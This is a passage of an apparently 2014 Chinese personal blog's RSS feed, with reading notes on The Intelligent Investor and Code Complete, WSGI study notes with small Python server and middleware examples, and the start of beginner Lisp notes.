&lt;p&gt;要想在一生中获得投资的成功，并不需要顶级的智商，超凡的商业头脑和秘密的信息，而是需要一个稳妥的知识体系作为决策的基础，并且有能力控制自己的情绪，使其不会对这种体系造成侵蚀。本书能够准确和清晰地提供这种知识体系，但对情绪的约束是你自己必须做到的。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;能否获得优异的投资成果，这既取决于你在投资方面付出的努力与拥有的知识，也取决于在你的投资生涯中，股市的愚蠢程度有多大。股市的行为越愚蠢，有条不紊的投资者面对的机会就越大。遵从格雷厄姆的建议，你就能从股市的愚蠢行为中获利，而不会成为愚蠢行为的参与者。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;希望每天做些“傻事,有创造性的事和慷慨的事”。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;他善于使自己的想法不带有任何说教或傲慢的成分。尽管他的想法是强有力的，但是，它们的表达方式无疑是温和的。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;本杰明·格雷厄姆生平简介&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;格雷厄姆深刻的见解来之不易：它来自于他本人投资失败的惨痛经历，以及对市场心理学数十年历史的孜孜研究。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;格雷厄姆建立了自己的核心原则。这些原则至今仍然适用：&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;股票并非仅仅是一个交易号码或电子信号，而是表明拥有一个实实在在的企业的所有权;企业内在价值并不依赖于其市场价格。  &lt;/li&gt;
&lt;li&gt;市场就像一个钟摆，永远在短命的乐观（它使得股票过于昂贵）和不合理的悲观（它使得股票过于廉价）之间摆动。聪明的投资者则是现实主义者，他们向乐观主义者卖出股票，并从悲观主义者手中买进股票。&lt;/li&gt;
&lt;li&gt;每一笔投资的未来价值时其现在价格的函数。你付出的价格越高，你的回报就越少。&lt;/li&gt;
&lt;li&gt;无论如何谨慎，每个投资者都免不了会犯错误。只有坚持格雷厄姆的所谓“安全性”原则—无论一笔投资看起来多么令人神往，永远都不要支付过高的价格—你才能使犯错的几率最小化。&lt;/li&gt;
&lt;li&gt;投资成功的秘诀在于你的内心。如果你在思考问题时持批判态度，不相信华尔街所谓的“事实”，并且以持久的信心进行投资，你就会获得稳定的收益，即便是在熊市亦如此。通过培养自己的约束力和勇气，你就不会让他人的情绪波动来左右你的投资目标。说到底，你的投资方式远不如你的行为方式重要。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;waiting&lt;/h3&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Tue, 25 Feb 2014 00:00:00 +0000</pubDate><guid>tag:,2014-02-25:book-The-intelligent-investor.html</guid><category>book</category></item><item><title>代码大全</title><link>/code-complete.html</link><description>&lt;p&gt;&lt;strong&gt;&lt;em&gt;*&lt;/em&gt;&lt;/strong&gt;&lt;strong&gt;&lt;em&gt;*&lt;/em&gt;&lt;/strong&gt;&lt;strong&gt;&lt;em&gt;*&lt;/em&gt;&lt;/strong&gt;摘自Steve McConnell《CODE COMPLETE》（代码大全）&lt;strong&gt;&lt;em&gt;*&lt;/em&gt;&lt;/strong&gt;&lt;strong&gt;&lt;em&gt;*&lt;/em&gt;&lt;/strong&gt;&lt;strong&gt;&lt;em&gt;*&lt;/em&gt;&lt;/strong&gt;**&lt;/p&gt;
&lt;p&gt;恰如张佳玮在知乎中提到的&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;好作者被人民推拥，更好的作者被好作者推拥.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;之所以捧起这本砖块厚的书，因这本书受到太多好作者的推荐。&lt;/p&gt;
&lt;p&gt;对于一个编程爱好者而言，这确实是一本“绝色佳人”级别的好书（--周筠）&lt;/p&gt;
&lt;p&gt;编程领域百科全书般的佳作。&lt;/p&gt;
&lt;p&gt;浅显的语言，平易近人且略带幽默的风格，读来如读杂文版酣畅淋漓。&lt;/p&gt;
&lt;p&gt;边读边做些书摘，为自己备忘，也与大家分享。
本书章节较为独立（模块化～），我就没按顺序阅读，根据自己的兴趣，随兴而读。&lt;/p&gt;
&lt;h3&gt;第二章：用隐喻来更充分地理解软件开发&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;这些形象的隐喻（比喻）描述了软件开发中各种特定的现象和事物...借助这些隐喻，我们能更深刻地理解软件开发的过程。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;隐喻把软件的开发过程与你熟悉的活动联系起来，帮助你更好地理解。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;第十一章：变量名的力量&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;好的变量名是提高程序可读性的一项关键要素。对特素种类的变量，比如循环变量下标和状态变量，需要加以特殊的考虑。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;名字要尽可能具体。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;命名规则应当能够区分局部数据/类数据和全局数据。它们还应当能区分类型名/具名常量/枚举类型名字和变量名&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;采用某种变量名命名规则&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;代码阅读的次数远远多于编写的次数。确保你所取的名字更侧重于阅读方便而不是编写方便&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;waiting...&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Tue, 25 Feb 2014 00:00:00 +0000</pubDate><guid>tag:,2014-02-25:code-complete.html</guid><category>code</category></item><item><title>wsgi学习笔记</title><link>/learning%20wsgi.html</link><description>&lt;p&gt;参考资料在文后列出，本文只是作为我个人的备忘，做个小结，如果想要了解更多细节，欢迎阅读文后参考资料。&lt;/p&gt;
&lt;p&gt;wsgi基本处理模式为 ： &lt;code&gt;WSGI Server&lt;/code&gt; -&amp;gt; &lt;code&gt;WSGI Middleware&lt;/code&gt;-&amp;gt; &lt;code&gt;WSGI Application&lt;/code&gt;
逐一学习以上三个部分。&lt;/p&gt;
&lt;h3&gt;WSGI Server/gateway&lt;/h3&gt;
&lt;h4&gt;功能&lt;/h4&gt;
&lt;p&gt;接收request请求，封装一系列环境变量，按照wsgi规范调用注册的wsgi app，最后将response返回给客户端。&lt;/p&gt;
&lt;h4&gt;基本工作流程&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;服务器创建socket，监听端口，等待客户端连接。&lt;/li&gt;
&lt;li&gt;当有请求来时，服务器解析客户端信息放到环境变量environ中，并调用绑定的handler来处理请求。&lt;/li&gt;
&lt;li&gt;handler解析这个http请求，将请求信息例如method，path等放到environ中。&lt;/li&gt;
&lt;li&gt;wsgi handler再将一些服务器端信息也放到environ中，最后服务器信息，客户端信息，本次请求信息全部都保存到了环境变量environ中。&lt;/li&gt;
&lt;li&gt;wsgi handler 调用注册的wsgi app，并将environ和回调函数传给wsgi app&lt;/li&gt;
&lt;li&gt;wsgi app 将reponse header/status/body 回传给wsgi handler&lt;/li&gt;
&lt;li&gt;最终handler还是通过socket将response信息塞回给客户端。&lt;/li&gt;
&lt;/ol&gt;
&lt;h3&gt;WSGI Application&lt;/h3&gt;
&lt;p&gt;wsgi application就是一个普通的callable对象，当有请求到来时，wsgi server会调用这个wsgi app。
这个对象接收两个参数，通常为environ和start_response。（理解为协议接口）.&lt;br /&gt;
environ就像前面介绍的，可以理解为环境变量，跟一次请求相关的所有信息都保存在了这个环境变量中，包括服务器信息，客户端信息，请求信息。start_response是一个callback函数，wsgi application通过调用start_response，将response headers/status 返回给wsgi server。此外这个wsgi app会return 一个iterator对象 ，这个iterator就是response body。&lt;br /&gt;
对着下面这个简单的例子看就明白很多了。&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;simple_app&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;environ&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;start_response&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;status&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;200 OK&amp;#39;&lt;/span&gt;
    &lt;span class="n"&gt;response_headers&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;[(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Content-type&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;text/plain&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)]&lt;/span&gt;
    &lt;span class="n"&gt;start_response&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;status&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;response_headers&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;u&amp;quot;This is hello wsgi app&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;encode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;utf8&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;我们再用wsgiref 作为wsgi server ，然后调用这个wsgi app，就能直观看到一次request,response的效果:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;wsgiref.simple_server&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;make_server&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;simple_app&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;environ&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;start_response&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;status&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;200 OK&amp;#39;&lt;/span&gt;
    &lt;span class="n"&gt;response_headers&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;[(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Content-type&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;text/plain&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)]&lt;/span&gt;
    &lt;span class="n"&gt;start_response&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;status&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;response_headers&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;u&amp;quot;This is hello wsgi app&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;encode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;utf8&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)]&lt;/span&gt;

&lt;span class="n"&gt;httpd&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;make_server&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;8000&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;simple_app&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Serving on port 8000...&amp;quot;&lt;/span&gt;
&lt;span class="n"&gt;httpd&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;serve_forever&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;此外，上面讲到了wsgi app只要是一个callable对象就可以了，因此不一定要是函数，一个实现了__call__方法的实例也可以&lt;/p&gt;
&lt;h3&gt;WSGI Middleware&lt;/h3&gt;
&lt;p&gt;上面的application看起来没什么意思，感觉没有太大用，但加上一层层的middleware包装之后就不一样了。&lt;/p&gt;
&lt;p&gt;以下例子用来实现URL路由：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;wsgiref.simple_server&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;make_server&lt;/span&gt;

&lt;span class="n"&gt;URL_PATTERNS&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;
&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;hi/&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;say_hi&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;hello/&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;say_hello&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;Dispatcher&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;object&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;

     &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;_match&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
          &lt;span class="n"&gt;path&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;split&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
          &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;url&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;app&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;URL_PATTERNS&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
               &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;path&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;url&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
               &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;app&lt;/span&gt;

     &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;__call__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;environ&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;start_response&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
          &lt;span class="n"&gt;path&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;environ&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;PATH_INFO&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
          &lt;span class="n"&gt;app&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;_match&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
          &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;app&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt;
                   &lt;span class="n"&gt;app&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;globals&lt;/span&gt;&lt;span class="p"&gt;()[&lt;/span&gt;&lt;span class="n"&gt;app&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
                    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;app&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;environ&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;start_response&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
          &lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                    &lt;span class="n"&gt;start_response&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;404 NOT FOUND&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,[(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Content-type&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;text/plain&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)])&lt;/span&gt;
                    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Page dose not exists!&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;say_hi&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;environ&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;start_response&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
     &lt;span class="n"&gt;start_response&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;200 OK&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,[(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Content-type&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;text/html&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)])&lt;/span&gt;
     &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;kenshin say hi to you!&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;say_hello&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;environ&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;start_response&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
     &lt;span class="n"&gt;start_response&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;200 OK&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,[(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Content-type&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;text/html&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)])&lt;/span&gt;
     &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;kenshin say hello to you!&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;

&lt;span class="n"&gt;app&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Dispatcher&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

&lt;span class="n"&gt;httpd&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;make_server&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;8000&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;app&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Serving on port 8000...&amp;quot;&lt;/span&gt;
&lt;span class="n"&gt;httpd&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;serve_forever&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="c1"&gt;#实际是装饰器模式，没有通过的话 提前返回  提示错误&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;经过这些middleware的包装，已经有点框架的感觉了。其实基于wsgi的框架，例如paste,pylons就是这样通过一层层middleware组合起来的。只是一个成熟的框架，这样的middleware会有很多&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;configure&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;app&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
     &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;ErrorHandlerMiddleware&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
          &lt;span class="n"&gt;SessionMiddleware&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
              &lt;span class="n"&gt;IdentificationMiddleware&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
                  &lt;span class="n"&gt;AuthenticationMiddleware&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
                        &lt;span class="n"&gt;UrlParserMiddleware&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;app&lt;/span&gt;&lt;span class="p"&gt;))))))&lt;/span&gt;

&lt;span class="c1"&gt;#哪一层有问题就在那里提前退出&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;只要这些Middleware符合wsgi规范，甚至还可以在各个框架之间组合重用。&lt;/p&gt;
&lt;p&gt;似乎写一个python web框架也不算太难～&lt;/p&gt;
&lt;p&gt;学习wsgi的感触：越是底层越是普适啊，越强大的抽象能力，也越接近于思想本身。各个框架不过是具体实现而已。就像柏拉图在《理想国》里说的 真实的事物只是对理念的模仿，唯有理念是不变的～
参考资料：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://blog.csdn.net/sraing/article/details/8455242"&gt;WSGI的理解&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://linluxiang.iteye.com/blog/799163"&gt;wsgi初探&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Sun, 23 Feb 2014 00:00:00 +0000</pubDate><guid>tag:,2014-02-23:learning wsgi.html</guid><category>python</category></item><item><title>lisp学习笔记1</title><link>/learnning-lisp-1.html</link><description>&lt;p&gt;对lisp关注久矣。&lt;br /&gt;
想不关注也难啊，阅读大神们的博客，Lisp，vi，emacs几乎都是高频词汇，360无死角地冲击你。&lt;br /&gt;
真正开始学习它是近期的事。算是慕名而来吧。尤其是在看了《黑客与画家》之后，更是迫不及待地在ubuntu里装上了clisp.
敲了第一行Lisp代码：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;(+ 1 2)
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Lisp的学习资料确实比较匮乏（国内而言），后来在图书馆看到《Clojure编程》(Lisp的方言之一)，才算是找到了较为系统的入门教材。于是饶有兴致地翻了起来，虽然之前也看过大神们对Lisp的赞叹，比如《黑客与画家》的作者paul graham，可当亲自阅读Clojure写出的代码时还是会为这种清晰而强大表达能力惊叹。怎么可以如此优美地书写！ &lt;br /&gt;
列表和函数是如此精巧而强大的东西。虽说在写python时也见识过列表的威力，却不知道它原来还能这样用！&lt;br /&gt;
虽说也写过不少函数，却丝毫不是函数式编程的风格。颇有‘我以前写的都是什么啊’的感受。&lt;br /&gt;
之前就曾读过“学习Lisp对你的其他语言有有莫大帮助”，如今信矣。&lt;br /&gt;
虽说至今也未在项目中使用Lisp,可函数式的风格已经帮助到我解决实际问题了--写出更利于维护的函数。
学习Lisp时日尚浅，不敢谈心得，恐见笑于大方之家，只分享下学习时的感受，也欢迎大牛们的指教。&lt;/p&gt;
&lt;p&gt;下面列出我所了解的Lisp，以及我所喜欢的一些特性，参考的文章（博客）在文后列出&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Lisp 是一门关于&lt;code&gt;列表&lt;/code&gt;的语言。Lisp 中的一切内容（从数据到组成应用程序的代码）都是列表.每个列表都由一些原子和列表组成。数字就是原子。键入一个数字仅仅会返回该数字作为结果.&lt;/li&gt;
&lt;li&gt;操纵列表的有两类函数：&lt;code&gt;构造函数&lt;/code&gt;和&lt;code&gt;选择函数&lt;/code&gt;。构造函数构建列表，选择函数分解列表。first 和 rest 是核心选择函数。first 选择函数返回列表的第一个原子，rest 选择函数返回除第一个原子外的整个列表 &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nb"&gt;&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;first&lt;/span&gt; &lt;span class="o"&gt;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;lions&lt;/span&gt; &lt;span class="nv"&gt;tigers&lt;/span&gt; &lt;span class="nv"&gt;bears&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;span class="nv"&gt;LIONS&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;如果希望构建列表而不是将其分开，就需要构造函数。构造函数构建新元素：即列表&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nb"&gt;&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;cons&lt;/span&gt; &lt;span class="ss"&gt;&amp;#39;lions&lt;/span&gt; &lt;span class="o"&gt;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;tigers&lt;/span&gt; &lt;span class="nv"&gt;bears&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
